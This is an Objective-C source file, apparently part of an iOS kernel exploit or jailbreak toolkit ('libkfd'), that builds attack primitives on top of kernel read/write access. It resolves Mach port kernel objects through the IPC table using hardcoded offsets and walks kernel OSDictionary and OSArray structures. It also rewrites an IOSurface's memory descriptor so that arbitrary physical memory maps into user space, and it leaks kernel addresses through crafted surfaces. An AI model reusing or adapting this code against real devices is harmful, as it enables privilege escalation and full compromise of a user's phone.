#include "libkfd/krkw/IOSurface_shared.h"
#import <Foundation/Foundation.h>
#include <malloc/_malloc.h>
#include <mach/vm_types.h>
#include <_types/_uint64_t.h>
#include <stdint.h>
#include <mach/arm/kern_return.h>
#include <mach/arm/vm_param.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/message.h>
#include <mach/port.h>
#include <mach/task.h>

#include <mach/vm_map.h>
#include <mach/vm_region.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#include <os/log.h>
#include "IOSurface_Primitives.h"
#include "libkfd.h"
#include "DriverKit.h"
#import "libkfd/perf.h"
#define fail(message) NSLog(message); \
kclose((struct kfd*)_kfd); \
exit(EXIT_FAILURE);
uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
    uint64_t surfaceClientsArray = kread64_ptr_kfd(rootUserClient + 0x118);
    return kread64_ptr_kfd(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
    return kread64_ptr_kfd(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
    return kread64_ptr_kfd(surfaceSendRight + 0x18);
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e0);
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
    kwrite64_kfd(surface + 0x3e0, ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x38);
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
    return kread64_ptr_kfd(memoryDescriptor + 0x60);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
    return kread64_kfd(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
    kwrite64_kfd(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
    kwrite8_kfd(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
    return kread32_kfd(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
    kwrite8_kfd(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
    kwrite64_kfd(memoryDescriptor + 0x28, memRef);
}

uint64_t IOMemoryDescriptor_get_memRef(uint64_t memoryDescriptor)
{
    return kread64_kfd(memoryDescriptor + 0x28);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e8);
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
    kwrite32_kfd(surface + 0x3e8, rangeCount);
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic)
{
    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge NSString *)kIOSurfaceWidth : @120,
        (__bridge NSString *)kIOSurfaceHeight : @120,
        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
    });
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
    IOSurfaceDecrementUseCount(surfaceRef);
    CFRelease(surfaceRef);
    return port;
}

//Thanks @jmpews
uint64_t kread64_smr_kfd(uint64_t where)
{
    uint64_t value = kread64_kfd(where) | 0xffffff8000000000;
    if((value & 0x400000000000) != 0)
        value &= 0xFFFFFFFFFFFFFFE0;
    return value;
}

uint64_t ipc_entry_lookup(mach_port_name_t port_name)
{
    uint64_t pr_task = get_current_task();
    uint64_t itk_space_pac = kread64_kfd(pr_task + off_task_itk_space);
    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    
    uint64_t is_table = kread64_smr_kfd(itk_space + off_ipc_space_is_table);
    uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
    uint64_t object_pac = kread64_kfd(entry + off_ipc_entry_ie_object);
    uint64_t object = object_pac | 0xffffff8000000000;
    uint64_t kobject_pac = kread64_kfd(object + off_ipc_port_ip_kobject);
    uint64_t kobject = kobject_pac | 0xffffff8000000000;
    
    return kobject;
}

void *IOSurface_map(uint64_t phys, uint64_t size)
{
    mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);

    uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
    uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
    uint64_t desc = IOSurface_get_memoryDescriptor(surface);
    uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);

    kwrite64_kfd(ranges, phys);
    kwrite64_kfd(ranges+8, size);

    IOMemoryDescriptor_set_size(desc, size);

    kwrite64_kfd(desc + 0x70, 0);
    kwrite64_kfd(desc + 0x18, 0);
    kwrite64_kfd(desc + 0x90, 0);

    IOMemoryDescriptor_set_wired(desc, true);

    uint32_t flags = IOMemoryDescriptor_get_flags(desc);
    IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);

    IOMemoryDescriptor_set_memRef(desc, 0);

    IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
    return IOSurfaceGetBaseAddress(mappedSurfaceRef);
}

static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
{
    uint64_t allocSize = 0x10;
    uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
    memset(addressRangesBuf, 0, size);
    addressRangesBuf[0] = (uint64_t)malloc(allocSize);
    addressRangesBuf[1] = allocSize;
    NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
    free(addressRangesBuf);

    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAllocSize" : @(allocSize),
        @"IOSurfaceAddressRanges" : addressRanges,
    });
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);
    return port;
}

unsigned long kstrlen(uint64_t string) {
    if (!string) return 0;
    
    unsigned long len = 0;
    char ch = 0;
    int i = 0;
    while (true) {
        kreadbuf_kfd(string + i, &ch, 1);
        if (!ch) break;
        len++;
        i++;
    }
    return len;
}

int kstrcmp_u(uint64_t string1, char *string2) {
    unsigned long len1 = kstrlen(string1);
    
    char *s1 = malloc(len1);
    kreadbuf_kfd(string1, s1, len1);
 
    int ret = strcmp(s1, string2);
    free(s1);
    
    return ret;
}

uint64_t OSDictionary_objectForKey(uint64_t dict, char *key) {
    uint64_t dict_buffer = kread64_kfd(dict + 32); // void *
    
    int i = 0;
    uint64_t key_sym = 0;
    do {
        key_sym = kread64_kfd(dict_buffer + i); // OSSymbol *
        uint64_t key_buffer = kread64_kfd(key_sym + 16); // char *
        if (!kstrcmp_u(key_buffer, key)) {
            return kread64_kfd(dict_buffer + i + 8);
        }
        i += 16;
    }
    while (key_sym);
    
    return 0;
}

uint32_t OSArray_objectCount(uint64_t array) {
    return kread32_kfd(array + 24);
}

uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = kread64_kfd(array + 32); // void *
    return kread64_kfd(array_buffer + idx * 8);
}

uint64_t OSData_buffer(uint64_t data) {
    return kread64_kfd(data + 24);
}

void OSData_setBuffer(uint64_t data, uint64_t buffer) {
    kwrite64_kfd(data + 24, buffer);
}

uint32_t OSData_length(uint64_t data) {
    return kread32_kfd(data + 16);
}

void OSData_setLength(uint64_t data, uint32_t length) {
    kwrite32_kfd(data + 16, length);
}

uint64_t kread_ptr(uint64_t kaddr) {
    uint64_t ptr = kread64_kfd(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }
    
    return ptr;
}

extern objcbridge *theobjcbridge;


NSString *GenerateRandomString(NSUInteger length) {
    NSMutableString *randomString = [NSMutableString stringWithCapacity:length];
    NSString *characters = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    for (NSUInteger i = 0; i < length; i++) {
        NSUInteger index = arc4random_uniform((uint32_t)[characters length]);
        [randomString appendFormat:@"%C", [characters characterAtIndex:index]];
    }

    return randomString;
}

UInt64 AllocMemoryTest(size_t allox_siz)
{
    IOSurfaceFastCreateArgs args = {0};
    //args.IOSurfaceAddress = 0;
    args.IOSurfaceAddress = (vm_address_t)malloc(allox_siz);
    args.IOSurfaceAllocSize =  (uint32_t)allox_siz;
    args.IOSurfacePixelFormat = 0x1EA5CACE;

    uint32_t id;

    while (true) {
        mach_port_t port = create_surface_fast_path(( struct kfd * )_kfd, get_surface_client(), &id, &args);

        uint64_t surfaceSendRight = ipc_entry_lookup(port);
        uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
        uint64_t va = IOSurface_get_ranges(surface);

        if (va == 0) continue;

        // IOSurface_set_ranges(surface, 0);
        // IOSurface_set_rangeCount(surface, 0);

        NSLog(@"VA -> %llx", va);
        return va;
    }
}